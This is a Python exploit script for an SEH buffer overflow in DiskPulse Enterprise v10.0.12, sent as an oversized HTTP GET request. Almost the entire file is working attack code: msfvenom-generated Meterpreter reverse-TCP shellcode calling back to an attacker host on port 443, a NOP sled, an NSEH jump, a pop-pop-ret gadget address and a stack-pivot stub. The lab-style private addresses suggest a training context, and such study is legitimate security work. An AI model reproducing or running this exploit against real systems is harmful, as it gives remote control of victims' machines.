#!/usr/bin/python
import socket, sys
from struct import pack

# DiskPulse Enterprise v10.0.12 SEH Overflow Exploit
# Author: RainbowDynamix (Julian Pena)

host = b"192.168.250.10" # RHOST
port = 80 # RPORT


def send_exploit_request():

    size = 6000

    nopsled = b"\x90" * 100

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.250 LPORT=443 -b "\x00\x09\x0a\x0d\x17\x20" -f python -v shellcode
    shellcode = b""
    shellcode += b"\xdb\xd4\xd9\x74\x24\xf4\x5f\xbe\x91\x05\xcf"
    shellcode += b"\xc5\x2b\xc9\xb1\x59\x31\x77\x19\x83\xef\xfc"
    shellcode += b"\x03\x77\x15\x73\xf0\x33\x2d\xfc\xfb\xcb\xae"
    shellcode += b"\x62\x75\x2e\x9f\xb0\xe1\x3a\xb2\x04\x61\x6e"
    shellcode += b"\x3f\xef\x27\x9b\x0e\x10\xc8\x14\x3a\xc8\x5c"
    shellcode += b"\x28\x93\x25\xa3\x61\xdf\x24\x5f\x78\x0c\x86"
    shellcode += b"\x5e\xb3\x41\xc7\xa7\x05\x2f\x28\x75\xc1\x44"
    shellcode += b"\xe4\x6a\x66\x18\x34\x8a\xa8\x16\x04\xf4\xcd"
    shellcode += b"\xe9\xf0\x48\xcf\x39\x73\x18\xd7\x32\xdb\xb9"
    shellcode += b"\xb7\x45\x08\x3c\xfe\x32\x92\x0e\xfe\xf2\x61"
    shellcode += b"\x44\x8b\x04\xa3\x94\x4b\xaa\x8a\x18\x46\xb2"
    shellcode += b"\xcb\x9f\xb9\xc1\x27\xdc\x44\xd2\xfc\x9e\x92"
    shellcode += b"\x57\xe2\x39\x50\xcf\xc6\xb8\xb5\x96\x8d\xb7"
    shellcode += b"\x72\xdc\xc9\xdb\x85\x31\x62\xe7\x0e\xb4\xa4"
    shellcode += b"\x61\x54\x93\x60\x29\x0e\xba\x31\x97\xe1\xc3"
    shellcode += b"\x21\x7f\x5d\x66\x2a\x92\x88\x16\xd3\x6c\xb5"
    shellcode += b"\x4a\x43\xa0\x78\x75\x93\xae\x0b\x06\xa1\x71"
    shellcode += b"\xa0\x80\x89\xfa\x6e\x56\x98\xed\x90\x88\x22"
    shellcode += b"\x7d\x6f\x29\x52\x57\xb4\x7d\x02\xcf\x1d\xfe"
    shellcode += b"\xc9\x0f\xa1\x2b\x67\x1a\x35\x14\xdf\x2b\x3f"
    shellcode += b"\xfc\x1d\x4c\xbe\x46\xa8\xaa\x90\xe8\xfa\x62"
    shellcode += b"\x51\x59\xba\xd2\x39\xb3\x35\x0c\x59\xbc\x9c"
    shellcode += b"\x25\xf0\x53\x48\x1d\x6d\xcd\xd1\xd5\x0c\x12"
    shellcode += b"\xcc\x93\x0f\x98\xe4\x64\xc1\x69\x8d\x76\x36"
    shellcode += b"\x0e\x6d\x87\xc7\xbb\x6d\xed\xc3\x6d\x3a\x99"
    shellcode += b"\xc9\x48\x0c\x06\x31\xbf\x0f\x41\xcd\x3e\x39"
    shellcode += b"\x39\xf8\xd4\x05\x55\x05\x39\x85\xa5\x53\x53"
    shellcode += b"\x85\xcd\x03\x07\xd6\xe8\x4b\x92\x4b\xa1\xd9"
    shellcode += b"\x1d\x3d\x15\x49\x76\xc3\x40\xbd\xd9\x3c\xa7"
    shellcode += b"\xbd\x1e\xc2\x35\xea\x86\xaa\xc5\xaa\x36\x2a"
    shellcode += b"\xac\x2a\x67\x42\x3b\x04\x88\xa2\xc4\x8f\xc1"
    shellcode += b"\xaa\x4f\x5e\xa3\x4b\x4f\x4b\x65\xd5\x50\x78"
    shellcode += b"\xbe\xe6\x2b\xf1\x41\x07\xcc\x1b\x26\x08\xcc"
    shellcode += b"\x23\x58\x35\x1a\x1a\x2e\x78\x9e\x19\x21\xcf"
    shellcode += b"\x83\x08\xa8\x2f\x97\x4b\xf9"

    # offset - 4
    buffer = b"A" * (2495 - len(nopsled) - len(shellcode))
    buffer += b"\xeb\x06\x90\x90" # NSEH
    buffer += pack("<L", (0x101576c0)) # (SEH) pop eax, pop ebx, ret
    buffer += b'\x66\x81\xC4\x98\x05\xff\xe4' # add sp,0x539 + jmp esp
    buffer += b"\x41" * (size - len(buffer))
    payload = nopsled + shellcode + buffer

    #HTTP Request
    request = b"GET /" + payload + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
